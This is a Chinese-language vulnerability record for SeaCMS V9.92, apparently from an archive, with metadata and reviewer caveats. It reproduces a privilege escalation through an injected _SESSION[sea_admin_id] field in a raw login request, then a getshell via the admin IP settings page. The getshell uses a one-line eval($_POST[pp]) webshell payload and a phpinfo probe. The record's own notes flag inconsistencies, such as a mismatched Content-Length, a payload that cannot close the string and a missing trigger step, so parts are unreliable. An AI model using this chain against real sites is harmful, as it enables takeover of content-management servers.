---
source: "hatch 补库批 20260928"
product: "SeaCMS9.92"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V9.92 越权+Getshell"
prerequisites: "来源所述条件，未列明部分仍待核：可注册登录会员且验证码有效；_SESSION覆盖入口、后台IP配置权限后续"
side_effects: "未执行；本文需注意的操作影响：Content-Length49与含SESSION字段的长正文不符；缺全局变量覆盖源码；PHP配置双引号写入却第一示例*;phpinfo无法闭合，第二双引号才相符；getshell请求/落点触发缺且image占位"
source_status: "unknown"
id: "vw-a5360c9c0d97492f36c97abd"
entity_id: "ve-a5360c9c0d97492f36c97abd"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：可注册登录会员且验证码有效；_SESSION覆盖入口、后台IP配置权限后续

- **适用与权限边界（1）**：设置sea_admin_id1却叙述管理员变-1不一致，需响应/session证据。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：Content-Length49与含SESSION字段的长正文不符；缺全局变量覆盖源码。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（3）**：PHP配置双引号写入却第一示例*;phpinfo无法闭合，第二双引号才相符；getshell请求/落点触发缺且image占位。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Seacms V9.92 越权+Getshell

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 越权

#### 1、首先注册一个普通用户

#### 2、burp抓包改包，下面是发送payload

    POST /login.php HTTP/1.1
    Host: 0-sec.org
    Content-Length: 49
    Cache-Control: max-age=0
    Origin: http://192.168.8.143
    Upgrade-Insecure-Requests: 1
    DNT: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://192.168.8.143/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=9sm********************ts7
    Connection: close

    dopost=login&userid=test&pwd=123456&validate=djyf&_SESSION[sea_admin_id]=1&_SESSION[sea_ckstr]=djyf

#### 3、 登陆后台页面，可以发现管理员账户变成-1了,也同时拥有管理员的权限

### getshell

/admin/ip.php

    if($action=="set")
    {
        $v= $_POST['v'];
        $ip = $_POST['ip'];
        $open=fopen("../data/admin/ip.php","w" );
        $str='<?php ';
        $str.='$v = "';
        $str.="$v";
        $str.='"; ';
        $str.='$ip = "';
        $str.="$ip";
        $str.='"; ';
        $str.=" ?>";
        fwrite($open,$str);
        fclose($open);
        ShowMsg("成功保存设置!","admin_ip.php");
        exit;

我们再去看一下ip.php格式

    <?php $v = "0"; $ip = " ";  ?>

我们可以构造一下,然后保存

    *;phpinfo();//
    ";@eval($_POST[pp]);//

image
